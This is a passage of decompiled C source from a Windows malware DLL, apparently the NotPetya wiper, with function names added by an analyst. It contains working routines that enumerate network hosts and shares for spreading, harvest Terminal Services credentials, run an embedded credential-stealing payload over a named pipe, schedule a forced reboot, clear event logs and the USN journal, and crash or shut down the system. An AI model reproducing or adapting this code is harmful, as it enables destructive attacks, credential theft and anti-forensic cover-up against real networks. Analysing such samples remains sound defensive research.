		if (WriteFile(v4, lpBuffer, a1, &lpFileName, 0) && a1 == lpFileName)
			v3 = 1;
		CloseHandle(v4);
	}
	return v3;
}

//----- (681F73FD) --------------------------------------------------------
DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
{
	HANDLE v1; // eax
	void *v2; // eax
	HANDLE v3; // eax
	signed int v4; // edi
	DWORD v5; // ST1C_4
	HANDLE v6; // eax
	void *v7; // edi
	_WORD *v8; // eax
	HANDLE v9; // eax
	struct _SECURITY_ATTRIBUTES SecurityAttributes; // [esp+Ch] [ebp-18h]
	DWORD NumberOfBytesRead; // [esp+18h] [ebp-Ch]
	DWORD TotalBytesAvail; // [esp+1Ch] [ebp-8h]
	HANDLE hNamedPipe; // [esp+20h] [ebp-4h]

	SecurityAttributes.nLength = 12;
	SecurityAttributes.bInheritHandle = 0;
	v1 = GetProcessHeap();
	v2 = HeapAlloc(v1, 8u, 0x14u);
	SecurityAttributes.lpSecurityDescriptor = v2;
	if (v2
		&& InitializeSecurityDescriptor(v2, 1u)
		&& SetSecurityDescriptorDacl(SecurityAttributes.lpSecurityDescriptor, 1, 0, 0))
	{
		do
		{
		LABEL_4:
			v3 = CreateNamedPipeW(lpThreadParameter, 3u, 6u, 1u, 0, 0, 0, &SecurityAttributes);
			hNamedPipe = v3;
		} while (v3 == -1);
		if (!ConnectNamedPipe(v3, 0))
			goto LABEL_19;
		v4 = 30;
		while (1)
		{
			--v4;
			TotalBytesAvail = 0;
			if (PeekNamedPipe(hNamedPipe, 0, 0, 0, &TotalBytesAvail, 0))
			{
				if (TotalBytesAvail)
				{
					v5 = TotalBytesAvail;
					v6 = GetProcessHeap();
					v7 = HeapAlloc(v6, 8u, v5);
					if (v7)
					{
						NumberOfBytesRead = 0;
						if (ReadFile(hNamedPipe, v7, TotalBytesAvail, &NumberOfBytesRead, 0)
							&& NumberOfBytesRead == TotalBytesAvail)
						{
							v8 = StrChrW(v7, 58);
							if (v8)
							{
								*v8 = 0;
								CleanUpHeaps(v7, v8 + 1, 2);
							}
						}
						v9 = GetProcessHeap();
						HeapFree(v9, 0, v7);
					}
				LABEL_18:
					FlushFileBuffers(hNamedPipe);
					DisconnectNamedPipe(hNamedPipe);
				LABEL_19:
					CloseHandle(hNamedPipe);
					goto LABEL_4;
				}
				Sleep(0x3E8u);
			}
			if (!v4)
				goto LABEL_18;
		}
	}
	return 0;
}
// 681FD234: using guessed type int __stdcall StrChrW(_DWORD, _DWORD);

//----- (681F7545) --------------------------------------------------------
int  Enum64BitProcessAndComPipes(__m64 a1, __m64 a2)
{
	HANDLE v2; // esi
	HMODULE v3; // eax
	FARPROC v4; // eax
	HRSRC v5; // eax
	int result; // eax
	int v7; // ecx
	_BYTE *i; // eax
	int v9; // ecx
	_BYTE *j; // eax
	void *v11; // ST28_4
	HANDLE v12; // eax
	WCHAR CommandLine; // [esp+8h] [ebp-1AA0h]
	WCHAR Parameter; // [esp+808h] [ebp-12A0h]
	WCHAR Buffer; // [esp+1008h] [ebp-AA0h]
	WCHAR TempFileName; // [esp+1418h] [ebp-690h]
	int Dst; // [esp+1A30h] [ebp-78h]
	__int16 v18; // [esp+1A60h] [ebp-48h]
	struct _PROCESS_INFORMATION ProcessInformation; // [esp+1A74h] [ebp-34h]
	GUID pguid; // [esp+1A84h] [ebp-24h]
	HANDLE hThread; // [esp+1A94h] [ebp-14h]
	int v22; // [esp+1A98h] [ebp-10h]
	LPOLESTR lpsz; // [esp+1A9Ch] [ebp-Ch]
	LPVOID lpMem; // [esp+1AA0h] [ebp-8h]
	int v25; // [esp+1AA4h] [ebp-4h]

	lpMem = 0;
	v25 = 0;
	v2 = GetCurrentProcess();
	v22 = 0;
	v3 = GetModuleHandleW(L"kernel32.dll");
	v4 = GetProcAddress(v3, "IsWow64Process");
	if (v4)
		(v4)(v2, &v22);
	v5 = FindResourceW(Src, ((v22 != 0) + 1), 0xA);
	if (v5)
		result = LoadAndLock(&lpMem, a1, a2, &v25, v5);
	else
		result = 0;
	if (result)
	{
		if (GetTempPathW(0x208u, &Buffer))
		{
			if (GetTempFileNameW(&Buffer, 0, 0, &TempFileName))
			{
				pguid.Data1 = 0;
				*&pguid.Data2 = 0;
				*pguid.Data4 = 0;
				*&pguid.Data4[4] = 0;
				if (CoCreateGuid(&pguid) >= 0)
				{
					lpsz = 0;
					if (StringFromCLSID(&pguid, &lpsz) >= 0)
					{
						if (CreateFileAndWrite(v25, &TempFileName, lpMem))
						{
							wsprintfW(&Parameter, L"\\\\.\\pipe\\%ws", lpsz);
							hThread = CreateThread(0, 0, StartAddress, &Parameter, 0, 0);
							if (hThread)
							{
								ProcessInformation.hProcess = 0;
								ProcessInformation.hThread = 0;
								ProcessInformation.dwProcessId = 0;
								ProcessInformation.dwThreadId = 0;
								memset(&Dst, 0, 0x44u);
								v18 = 0;
								Dst = 68;
								wsprintfW(&CommandLine, L"\"%ws\" %ws", &TempFileName, &Parameter);
								if (CreateProcessW(&TempFileName, &CommandLine, 0, 0, 0, 0x8000000u, 0, 0, &Dst, &ProcessInformation))
								{
									WaitForSingleObject(ProcessInformation.hProcess, 0xEA60u);
									EnterAndLeaveCritSection_4(lpCriticalSection);
									TerminateThread(hThread, 0);
								}
								CloseHandle(hThread);
							}
							v7 = v25;
							for (i = lpMem; v7; --v7)
								*i++ = 0;
							CreateFileAndWrite(v25, &TempFileName, lpMem);
							DeleteFileW(&TempFileName);
						}
						CoTaskMemFree(lpsz);
					}
				}
			}
		}
		v9 = v25;
		for (j = lpMem; v9; --v9)
			*j++ = 0;
		v11 = lpMem;
		v12 = GetProcessHeap();
		result = HeapFree(v12, 0, v11);
	}
	return result;
}

//----- (681F777B) --------------------------------------------------------
BOOL __stdcall EnumNetIPProtocols(int a1)
{
	BOOL v1; // ebx
	HMODULE v2; // eax
	FARPROC v3; // edi
	HANDLE v4; // eax
	unsigned int *v5; // esi
	int v6; // eax
	unsigned __int8 *v7; // edi
	HANDLE v8; // eax
	WCHAR v10; // [esp+4h] [ebp-50h]
	HMODULE hLibModule; // [esp+44h] [ebp-10h]
	unsigned int *v12; // [esp+48h] [ebp-Ch]
	int v13; // [esp+4Ch] [ebp-8h]
	unsigned int v14; // [esp+50h] [ebp-4h]

	v1 = 0;
	v2 = LoadLibraryW(L"iphlpapi.dll");
	hLibModule = v2;
	if (v2)
	{
		v3 = GetProcAddress(v2, "GetExtendedTcpTable");
		if (v3)
		{
			v13 = 0x100000;
			v4 = GetProcessHeap();
			v5 = HeapAlloc(v4, 8u, 0x100000u);
			v12 = v5;
			if (v5)
			{
				v6 = (v3)(v5, &v13, 0, 2, 1, 0);
				v1 = v6 == 0;
				if (!v6)
				{
					v14 = 0;
					if (*v5)
					{
						v7 = v5 + 18;
						do
						{
							if (*(v7 - 14) == 5)
							{
								wsprintfW(&v10, L"%u.%u.%u.%u", *(v7 - 2), *(v7 - 1), *v7, v7[1]);
								sub_681F6FC7(&v10, 0, a1);
								v5 = v12;
							}
							++v14;
							v7 += 20;
						} while (v14 < *v5);
					}
				}
				v8 = GetProcessHeap();
				HeapFree(v8, 0, v5);
			}
		}
		else
		{
			GetLastError();
		}
		FreeLibrary(hLibModule);
	}
	return v1;
}

//----- (681F786B) --------------------------------------------------------
int __stdcall EnumNetIpServices(int a1)
{
	ULONG v1; // eax
	SIZE_T v3; // ST14_4
	HANDLE v4; // eax
	struct _MIB_IPNETTABLE *v5; // ebx
	const char *v6; // ebx
	HANDLE v7; // eax
	WCHAR v8; // [esp+8h] [ebp-54h]
	int v9; // [esp+48h] [ebp-14h]
	int v10; // [esp+4Ch] [ebp-10h]
	struct _MIB_IPNETTABLE *v11; // [esp+50h] [ebp-Ch]
	unsigned int v12; // [esp+54h] [ebp-8h]
	ULONG SizePointer; // [esp+58h] [ebp-4h]

	v10 = 0;
	SizePointer = 0;
	v1 = GetIpNetTable(0, &SizePointer, 0);
	if (v1 == 232)
		return 0;
	if (v1 == 122)
	{
		v3 = SizePointer;
		v4 = GetProcessHeap();
		v5 = HeapAlloc(v4, 0, v3);
		v11 = v5;
		if (v5)
		{
			if (!GetIpNetTable(v5, &SizePointer, 0))
			{
				v10 = 1;
				v12 = 0;
				if (v5->dwNumEntries > 0)
				{
					v9 = 3;
					v6 = &v5->table[0].dwAddr + 2;
					do
					{
						if (!memcmp(v6 + 2, &v9, 4))
						{
							wsprintfW(&v8, L"%u.%u.%u.%u", *(v6 - 2), *(v6 - 1), *v6, *(v6 + 1));
							sub_681F6FC7(&v8, 0, a1);
						}
						++v12;
						v6 += 24;
					} while (v12 < v11->dwNumEntries);
					v5 = v11;
				}
			}
			v7 = GetProcessHeap();
			HeapFree(v7, 0, v5);
		}
	}
	return v10;
}

//----- (681F795A) --------------------------------------------------------
LPCWSTR __stdcall EnumNetServers(int a1, DWORD servertype, LPCWSTR domain)
{
	DWORD v3; // eax
	DWORD v4; // ebx
	LPBYTE v5; // edi
	DWORD totalentries; // [esp+8h] [ebp-10h]
	DWORD resume_handle; // [esp+Ch] [ebp-Ch]
	DWORD entriesread; // [esp+10h] [ebp-8h]
	LPBYTE bufptr; // [esp+14h] [ebp-4h]
	LPCWSTR domaina; // [esp+28h] [ebp+10h]

	bufptr = 0;
	entriesread = 0;
	totalentries = 0;
	resume_handle = 0;
	v3 = NetServerEnum(0, 0x65u, &bufptr, 0xFFFFFFFF, &entriesread, &totalentries, servertype, domain, &resume_handle);
	if (v3 && v3 != 234)
	{
		domaina = 0;
	}
	else
	{
		domaina = 1;
		if (!bufptr)
			return domaina;
		v4 = 0;
		if (entriesread > 0)
		{
			v5 = bufptr + 4;
			do
			{
				if (v5 == 4)
					break;
				if (*(v5 + 3) >= 0)
				{
					if (*(v5 - 1) == 500 && (*(v5 + 1) & 0xFu) > 4)
						sub_681F6FC7(*v5, 0, a1);
				}
				else
				{
					EnumNetServers(a1, 3u, *v5);
				}
				v5 += 24;
				++v4;
			} while (v4 < entriesread);
		}
	}
	if (bufptr)
		NetApiBufferFree(bufptr);
	return domaina;
}

//----- (681F7A17) --------------------------------------------------------
int __stdcall EnumNetResources(int a1, LPNETRESOURCEW lpNetResource)
{
	char *v2; // esi
	DWORD v3; // eax
	int v4; // edi
	signed int v5; // ecx
	_WORD *v6; // eax
	__int16 v7; // si
	char *v9; // [esp+8h] [ebp-14h]
	HANDLE hEnum; // [esp+Ch] [ebp-10h]
	int v11; // [esp+10h] [ebp-Ch]
	DWORD cCount; // [esp+14h] [ebp-8h]
	SIZE_T dwBytes; // [esp+18h] [ebp-4h]
	LPNETRESOURCEW lpNetResourcea; // [esp+28h] [ebp+Ch]

	cCount = -1;
	v11 = 0;
	dwBytes = 0x4000;
	if (!WNetOpenEnumW(1u, 0, 0, lpNetResource, &hEnum))
	{
		v2 = GlobalAlloc(0x40u, dwBytes);
		v9 = v2;
		if (v2)
		{
			v11 = 1;
			while (1)
			{
				memset(v2, 0, dwBytes);
				v3 = WNetEnumResourceW(hEnum, &cCount, v2, &dwBytes);
				if (v3)
					break;
				lpNetResourcea = 0;
				if (cCount > 0)
				{
					v4 = (v2 + 20);
					do
					{
						v5 = 2;
						if ((*(v4 - 8) & 2) == 2)
						{
							EnumNetResources(a1, (v4 - 20));
						}
						else
						{
							v6 = *v4;
							if (*v4 && *v6 == 92 && v6[1] == 92)
							{
								if (v6[2])
								{
									v7 = v6[2];
									do
									{
										if (v7 == 92)
											break;
										v7 = v6[++v5];
									} while (v7);
								}
								v6[v5] = 0;
								sub_681F6FC7((*v4 + 4), 0, a1);
								v2 = v9;
							}
						}
						lpNetResourcea = (lpNetResourcea + 1);
						v4 += 32;
					} while (lpNetResourcea < cCount);
				}
			}
			if (v3 != 259)
				v11 = 0;
			GlobalFree(v2);
			WNetCloseEnum(hEnum);
		}
	}
	return v11;
}

//----- (681F7B31) --------------------------------------------------------
int __stdcall EnumerateWindowsCredentials(int a1)
{
	unsigned int v1; // eax
	int v2; // esi
	int v3; // eax
	char *v4; // edi
	const wchar_t *v5; // edx
	const wchar_t *v6; // ecx
	signed int v7; // ecx
	int v9; // [esp+4h] [ebp-14h]
	unsigned int v10; // [esp+8h] [ebp-10h]
	signed int v11; // [esp+Ch] [ebp-Ch]
	int v12; // [esp+10h] [ebp-8h]
	unsigned int v13; // [esp+14h] [ebp-4h]

	v12 = 0;
	v13 = 0;
	v9 = CredEnumerateW(0, 0, &v13, &v12);
	if (v9)
	{
		v1 = 0;
		v10 = 0;
		if (v13 > 0)
		{
			while (1)
			{
				v2 = v12 + 4 * v1;
				v3 = *v2;
				v4 = *(*v2 + 8);
				if (v4)
				{
					v11 = 8;
					v5 = L"TERMSRV/";
					v6 = *(*v2 + 8);
					while (*v6 == *v5)
					{
						++v6;
						++v5;
						if (!--v11)
						{
							v7 = 0;
							goto LABEL_8;
						}
					}
					v7 = *v6 < *v5 ? -1 : 1;
				LABEL_8:
					if (v7 == 0)
					{
						v4 += 16;
						if (*(v3 + 4) == 1)
							break;
					}
				}
				if (*(v3 + 4) == 2)
					goto LABEL_15;
			LABEL_16:
				v1 = v10 + 1;
				v10 = v1;
				if (v1 >= v13)
					goto LABEL_17;
			}
			if (*(v3 + 48) && *(v3 + 28))
				CleanUpHeaps(*(v3 + 48), *(v3 + 28), 0);
		LABEL_15:
			sub_681F6FC7(v4, 0, a1);
			goto LABEL_16;
		}
	LABEL_17:
		CredFree(v12);
	}
	return v9;
}
// 681FD040: using guessed type int __stdcall CredEnumerateW(_DWORD, _DWORD, _DWORD, _DWORD);
// 681FD044: using guessed type int __stdcall CredFree(_DWORD);
// 682040BC: using guessed type wchar_t aTermsrv[9];

//----- (681F7C10) --------------------------------------------------------
void __stdcall  GetPhysicalNetBiosAndWait(LPVOID lpThreadParameter)
{
	struct _RTL_CRITICAL_SECTION *v1; // edi
	signed int v2; // esi
	WCHAR Buffer; // [esp+Ch] [ebp-20Ch]
	DWORD nSize; // [esp+214h] [ebp-4h]

	v1 = lpParameter;
	sub_681F6FC7(L"127.0.0.1", 1, lpParameter);
	sub_681F6FC7(L"localhost", 1, v1);
	nSize = 260;
	if (GetComputerNameExW(ComputerNamePhysicalNetBIOS, &Buffer, &nSize))
		sub_681F6FC7(&Buffer, 1, v1);
	CreateThread(0, 0, GetNetworkInterfaces, v1, 0, 0);
	v2 = 0;
	while (1)
	{
		EnumNetIPProtocols(v1);
		EnumNetIpServices(v1);
		if (!v2)
		{
			EnumNetServers(v1, 0x80000000, 0);
			v2 = 1;
		}
		Sleep(0x2BF20u);
	}
}
// 682040E4: using guessed type wchar_t aLocalhost[10];

//----- (681F7CA5) --------------------------------------------------------
bool __stdcall CompareMemoryAllocs(const void *a1, const void *a2, unsigned int a3)
{
	return memcmp(a1, a2, a3) == 0;
}

//----- (681F7CC0) --------------------------------------------------------
void PerformPrivChecks()
{
	signed int PrivLevel; // esi

	PrivLevel = 0;
	if (!PrivCheckCompleted)
	{
		TickCountTime = GetTickCount();
		if (CheckPrivsAdjustTokens(L"SeShutdownPrivilege"))
			PrivLevel = 1;
		if (CheckPrivsAdjustTokens(L"SeDebugPrivilege"))
			PrivLevel |= 2u;
		if (CheckPrivsAdjustTokens(L"SeTcbPrivilege"))
			PrivLevel |= 4u;
		gPrivLevel = PrivLevel;
		EnumeratedProcessesHandle = EnumerateProcesses();
		if (GetModuleFileNameW(Src, &pszPath, 0x30Cu))
			CreateSomeFile();
	}
}
// 6820F104: using guessed type int EnumeratedProcessesHandle;
// 6820F114: using guessed type int PrivCheckCompleted;
// 6820F118: using guessed type int TickCountTime;
// 6820F144: using guessed type int gPrivLevel;

//----- (681F7D39) --------------------------------------------------------
BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	if (fdwReason == 1)
	{
		Src = hinstDLL;
		DisableThreadLibraryCalls(hinstDLL);
	}
	return 1;
}

//----- (681F7D58) --------------------------------------------------------
DWORD __stdcall SetThreadParam(LPVOID lpThreadParameter)
{
	signed int v1; // eax

	v1 = CheckSecurityAuthorityAndTokens();
	if (lpThreadParameter)
		*lpThreadParameter = v1;
	return 0;
}

//----- (681F7D6F) --------------------------------------------------------
signed int  SelfLocalHostCheck(__m64 mm0_0, __m64 a2, const unsigned __int16 *a1)
{
	signed int v3; // esi
	WCHAR pszPath; // [esp+4h] [ebp-618h]

	v3 = 0;
	if (dword_6820F0FC)
	{
		if (dword_6820F11C)
		{
			if (SetWideAddress(mm0_0, a2, L"127.0.0.1", a1, wcslen(a1)))
			{
				Sleep(0xBB8u);
				if (PathCombineWithCWindows(&pszPath))
				{
					if (PathFileExistsW(&pszPath))
						v3 = 1;
				}
			}
		}
	}
	return v3;
}

//----- (681F7DEB) --------------------------------------------------------
void  perfc_1(__m64 a1, __m64 a2, int a3, DWORD dwErrCode, HANDLE Thread, HANDLE hThread)
{
	int v6; // eax
	HANDLE *v7; // esi
	HANDLE v8; // eax
	_DWORD *v9; // eax
	HANDLE v10; // ST14_4
	HANDLE v11; // eax
	HMODULE v12; // eax
	FARPROC v13; // eax
	unsigned __int16 v14[8192]; // [esp+Ch] [ebp-4A18h]
	WCHAR v15; // [esp+400Ch] [ebp-A18h]
	__int16 v16; // [esp+480Ah] [ebp-21Ah]
	char Src; // [esp+480Ch] [ebp-218h]
	int Dst; // [esp+490Ch] [ebp-118h]
	int v19; // [esp+4910h] [ebp-114h]
	int v20; // [esp+4914h] [ebp-110h]
	HANDLE Token; // [esp+4A20h] [ebp-4h]

	PerformPrivChecks();
	if (hThread != -1)
		SetVirtualAttributes(a3, dwErrCode, Thread);
	WSAStartup(0x202u, &stru_6820F768);
	lpParameter = sub_681F7091(36, CompareStringsW, 0, 0xFFFF);
	lpCriticalSection = sub_681F7091(8, CompareStringsW_2, CleanUpHeaps_3, 255);
	dword_6820F110 = 0;
	InitializeCriticalSection(&CriticalSection);
	CheckCmdLineArgs(Thread);
	if (gPrivLevel & 2)
	{
		SomeFileCheck();
		SetLockAtCDir();
	}
	CreateScheduledTaskAsAdmin();
	CreateThread(0, 0, GetPhysicalNetBiosAndWait, 0, 0, 0);
	if (gPrivLevel & 2 && EnumeratedProcessesHandle & 1)
		Enum64BitProcessAndComPipes(a1, a2);
	EnterAndLeaveCritSection_4(lpCriticalSection);
	if (EnumeratedProcessesHandle & 2)
		GetDllHostData(a1, a2, gPrivLevel & 6);
	if (!(gPrivLevel & 4)
		|| (dword_6820F110 = sub_681F7091(4, CompareMemoryAllocs, 0, 255), (v6 = EnumerateProcessesAndTokens(&Src)) == 0))
	{
	LABEL_29:
		EnterAndLeaveCritSection_4(dword_6820F110);
		CreateThread(0, 0, sub_681FA0FE, 0, 0, 0);
		hThread = 0;
		a3 = 0;
		Thread = 0;
		dwErrCode = 0;
		GetNetServerInfo(&hThread, &a3, &Thread, &dwErrCode);
		v8 = GetProcessHeap();
		v9 = HeapAlloc(v8, 8u, 4u);
		Token = v9;
		if (v9)
		{
			*v9 = 60000 * Thread;
			if (!CreateThread(0, 0, SleepAndFreeHeap, v9, 0, 0))
			{
				v10 = Token;
				v11 = GetProcessHeap();
				HeapFree(v11, 0, v10);
			}
		}
		Sleep(60000 * hThread);
		if (EnumeratedProcessesHandle & 0x10)
			CheckDriveAndPubKey();
		Sleep(60000 * dwErrCode);
		if (gPrivLevel & 2
			|| (memset(&Dst, 0, 0x114u), Dst = 276, !GetVersionExW(&Dst))
			|| (v19 != 5 || v20 != 1 && v20 != 2) && (v19 != 6 || v20 && v20 != 1)
			|| (sub_681F6BB0(v14), !SelfLocalHostCheck(a1, a2, v14)))
		{
			Sleep(60000 * a3);
			wsprintfW(
				&v15,
				L"wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D %c:",
				pszPath);
			v16 = 0;
			LaunchCMDProcess(&v15, 3);
			if (gPrivLevel & 1)
			{
				v12 = GetModuleHandleA("ntdll.dll");
				if (v12)
				{
					v13 = GetProcAddress(v12, "NtRaiseHardError");
					if (v13)
						(v13)(-1073740976, 0, 0, 0, 6, &Thread);
				}
				if (!InitiateSystemShutdownExW(0, 0, 0, 1, 1, 0x80000000))
					ExitWindowsEx(6u, 0);
			}
		}
		ExitProcess(0);
	}
	v7 = &Src;
	a3 = v6;
	while (1)
	{
		Token = *v7;
		Thread = 0;
		dwErrCode = 0;
		Thread = CreateThread(0, 0, sub_681F9F8E, 0, 4u, 0);
		if (!Thread)
		{
			dwErrCode = 87;
			goto LABEL_20;
		}
		if (!SetThreadToken(&Thread, Token))
			break;
		if (ResumeThread(Thread) == -1)
			goto LABEL_18;
	LABEL_20:
		SetLastError(dwErrCode);
		dwErrCode = *v7;
		Thread = 0;
		hThread = CreateThread(0, 0, SetThreadParam, &Thread, 4u, 0);
		if (hThread)
		{
			if (SetThreadToken(&hThread, dwErrCode))
			{
				if (ResumeThread(hThread) == -1)
					GetLastError();
				else
					WaitForSingleObject(hThread, 0xFFFFFFFF);
			}
			CloseHandle(hThread);
		}
		if (Thread)
			EnumerateProcessHeap(dword_6820F110, v7, 0);
		++v7;
		if (!--a3)
			goto LABEL_29;
	}
	dwErrCode = GetLastError();
LABEL_18:
	CloseHandle(Thread);
	goto LABEL_20;
}
// 6820F104: using guessed type int EnumeratedProcessesHandle;
// 6820F144: using guessed type int gPrivLevel;

//----- (681F81BA) --------------------------------------------------------
BOOL __stdcall CheckPrivsAdjustTokens(LPCWSTR lpName)
{
	BOOL v1; // ebx
	HANDLE v2; // eax
	struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-18h]
	DWORD dwErrCode; // [esp+1Ch] [ebp-8h]
	HANDLE TokenHandle; // [esp+20h] [ebp-4h]

	NewState.PrivilegeCount = 0;
	NewState.Privileges[0].Luid.LowPart = 0;
	NewState.Privileges[0].Luid.HighPart = 0;
	NewState.Privileges[0].Attributes = 0;
	v1 = 0;
	dwErrCode = 0;
	TokenHandle = 0;
	v2 = GetCurrentProcess();
	if (OpenProcessToken(v2, 0x28u, &TokenHandle))
	{
		if (LookupPrivilegeValueW(0, lpName, NewState.Privileges))
		{
			NewState.PrivilegeCount = 1;
			NewState.Privileges[0].Attributes = 2;
			v1 = AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);
			dwErrCode = GetLastError();
			if (dwErrCode)
				v1 = 0;
		}
	}
	SetLastError(dwErrCode);
	return v1;
}

//----- (681F8243) --------------------------------------------------------
signed int FreeNetApiBuffer()
{
	signed int v0; // esi
	int v1; // eax
	LPBYTE bufptr; // [esp+4h] [ebp-4h]

	v0 = 0;
	bufptr = 0;
	if (!NetServerGetInfo(0, 0x65u, &bufptr))
	{
		v1 = *(bufptr + 4);
		if (v1 & 0x8000 || v1 & 0x18)
			v0 = 1;
	}
	if (bufptr)
		NetApiBufferFree(bufptr);
	return v0;
}

//----- (681F8282) --------------------------------------------------------
unsigned int *__stdcall GetNetServerInfo(int *a1, unsigned int *a2, unsigned int *a3, int *a4)
{
	unsigned int v4; // edi
	signed int v5; // ebx
	int v6; // esi
	unsigned int v7; // eax
	int v8; // ecx
	unsigned int *result; // eax
	LPBYTE bufptr; // [esp+Ch] [ebp-4h]

	v4 = ReturnTimeIfTimePassed();
	v5 = 0;
	v6 = v4 > 0x55 ? v4 - 85 : 0;
	bufptr = 0;
	if (!NetServerGetInfo(0, 0x65u, &bufptr) && bufptr[16] & 0x18)
		v5 = 1;
	if (bufptr)
		NetApiBufferFree(bufptr);
	if (v5)
		v4 += 15;
	v7 = v4 / 3;
	if (v4 <= 0x55)
		v8 = v4 > 0xF ? v4 - 15 : 0;
	else
		v8 = 70;
	if (v4 > 0xF)
		v4 = 15;
	if (a1)
		*a1 = v6;
	if (a3)
		*a3 = v7;
	if (a4)
		*a4 = v8;
	result = a2;
	if (a2)
		*a2 = v4;
	return result;
}

//----- (681F8320) --------------------------------------------------------
int __stdcall PathCombineWithCWindows(LPWSTR pszDest)
{
	signed int v1; // esi
	const WCHAR *v2; // eax
	LPWSTR v3; // eax

	v1 = 0;
	v2 = PathFindFileNameW(&pszPath);
	if (PathCombineW(pszDest, L"C:\\Windows\\", v2))
	{
		v3 = PathFindExtensionW(pszDest);
		if (v3)
		{
			*v3 = 0;
			v1 = 1;
		}
	}
	return v1;
}

//----- (681F835E) --------------------------------------------------------
HANDLE SomeFileCheck()
{
	HANDLE v0; // esi
	WCHAR pszPath; // [esp+4h] [ebp-618h]

	v0 = 0;
	if (PathCombineWithCWindows(&pszPath))
	{
		if (PathFileExistsW(&pszPath))
			ExitProcess(0);
		v0 = CreateFileW(&pszPath, GENERIC_WRITE, 0, 0, 2u, GENERIC_WRITE, 0);  // + 1 != 0; // change
	}
	return v0;
}

//----- (681F83BD) --------------------------------------------------------
BOOL  LaunchCMDProcess(int a1, int a2)
{
	int v2; // esi
	BOOL v3; // edi
	signed int v4; // ecx
	struct _PROCESS_INFORMATION *v5; // eax
	signed int v6; // edx
	struct _STARTUPINFOW *v7; // eax
	WCHAR CommandLine; // [esp+Ch] [ebp-E6Ch]
	WCHAR Buffer; // [esp+80Ch] [ebp-66Ch]
	struct _STARTUPINFOW StartupInfo; // [esp+E24h] [ebp-54h]
	struct _PROCESS_INFORMATION ProcessInformation; // [esp+E68h] [ebp-10h]

	v2 = a1;
	v3 = 0;
	wsprintfW(&CommandLine, L"/c %ws", a1);
	*(v2 + 2046) = 0;
	if (GetEnvironmentVariableW(L"ComSpec", &Buffer, 0x30Cu)
		|| GetSystemDirectoryW(&Buffer, 0x30Cu) && lstrcatW(&Buffer, L"\\cmd.exe"))
	{
		v4 = 16;
		v5 = &ProcessInformation;
		do
		{
			LOBYTE(v5->hProcess) = 0;
			v5 = (v5 + 1);
			--v4;
		} while (v4);
		v6 = 68;
		v7 = &StartupInfo;
		do
		{
			LOBYTE(v7->cb) = 0;
			v7 = (v7 + 1);
			--v6;
		} while (v6);
		StartupInfo.cb = 68;
		v3 = CreateProcessW(&Buffer, &CommandLine, 0, 0, 0, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation);
		if (v3)
			Sleep(1000 * a2);
	}
	return v3;
}

//----- (681F8494) --------------------------------------------------------
signed int GetversionInfo()
{
	signed int v0; // edi
	int Dst; // [esp+4h] [ebp-114h]
	unsigned int v3; // [esp+8h] [ebp-110h]

	v0 = 0;
	memset(&Dst, 0, 0x114u);
	Dst = 276;
	if (GetVersionExW(&Dst) && v3 > 5)
		v0 = 1;
	return v0;
}

//----- (681F84DF) --------------------------------------------------------
BOOL CreateScheduledTaskAsAdmin()
{
	BOOL v0; // ebx
	DWORD v1; // eax
	unsigned int v2; // esi
	unsigned int v3; // edi
	int *v4; // eax
	WCHAR v6; // [esp+Ch] [ebp-E28h]
	__int16 v7; // [esp+80Ah] [ebp-62Ah]
	WCHAR Buffer; // [esp+80Ch] [ebp-628h]
	struct _SYSTEMTIME SystemTime; // [esp+E24h] [ebp-10h]

	v0 = 0;
	GetLocalTime(&SystemTime);
	v1 = ReturnTimeIfTimePassed();
	if (v1 < 0xA)
		v1 = 10;
	v2 = (v1 + 3) % 0x3C + SystemTime.wMinute;
	v3 = ((v1 + 3) / 0x3C + SystemTime.wHour) % 0x18;
	if (GetSystemDirectoryW(&Buffer, 0x30Cu) && PathAppendW(&Buffer, L"shutdown.exe /r /f"))
	{
		if (GetversionInfo())
		{
			v4 = L"/RU \"SYSTEM\" ";
			if (!(gPrivLevel & 4))
				v4 = &NullByte;
			wsprintfW(&v6, L"schtasks %ws/Create /SC once /TN \"\" /TR \"%ws\" /ST %02d:%02d", v4, &Buffer, v3, v2);
		}
		else
		{
			wsprintfW(&v6, L"at %02d:%02d %ws", v3, v2, &Buffer);
		}
		v7 = 0;
		v0 = LaunchCMDProcess(&v6, 0);
	}
	return v0;
}
// 6820436C: using guessed type wchar_t aRuSystem[14];
// 6820F144: using guessed type int gPrivLevel;

//----- (681F85D0) --------------------------------------------------------
int  LoadAndLock(void **a1, __m64 mm0_0, __m64 a3, int a2, HRSRC hResInfo)
{
	HGLOBAL v5; // eax
	HRSRC *v6; // esi
	HRSRC v7; // ST0C_4
	HANDLE v8; // eax
	void *v9; // eax
	void *v10; // ST0C_4
	HANDLE v11; // eax
	DWORD v13; // [esp+0h] [ebp-8h]
	signed int v14; // [esp+4h] [ebp-4h]

	v14 = 0;
	v5 = LoadResource(Src, hResInfo);
	if (v5)
	{
		v6 = LockResource(v5);
		if (v6)
		{
			v13 = SizeofResource(Src, hResInfo);
			if (v13)
			{
				v7 = *v6;
				v8 = GetProcessHeap();
				v9 = HeapAlloc(v8, 8u, v7);
				*a1 = v9;
				if (v9)
				{
					hResInfo = *v6;
					if (SomeVersionCheck(mm0_0, a3, v9, &hResInfo, (v6 + 1), v13 - 4))
					{
						v10 = *a1;
						v11 = GetProcessHeap();
						HeapFree(v11, 0, v10);
					}
					else
					{
						if (a2)
							*a2 = hResInfo;
						v14 = 1;
					}
				}
			}
		}
	}
	return v14;
}

//----- (681F8677) --------------------------------------------------------
int EnumerateProcesses()
{
	unsigned int v0; // ebx
	unsigned int v1; // kr00_4
	unsigned int v2; // edx
	unsigned int v3; // esi
	_BYTE *v4; // ecx
	char v5; // al
	PROCESSENTRY32W pe; // [esp+0h] [ebp-238h]
	HANDLE hSnapshot; // [esp+22Ch] [ebp-Ch]
	int v9; // [esp+230h] [ebp-8h]
	int v10; // [esp+234h] [ebp-4h]

	v10 = -1;
	hSnapshot = CreateToolhelp32Snapshot(2u, 0);
	if (hSnapshot != -1)
	{
		pe.dwSize = 556;
		if (Process32FirstW(hSnapshot, &pe))
		{
			do
			{
				v9 = 0x12345678;
				v0 = 0;
				v1 = wcslen(pe.szExeFile);
				do
				{
					v2 = 0;
					if (v1)
					{
						v3 = v0;
						do
						{
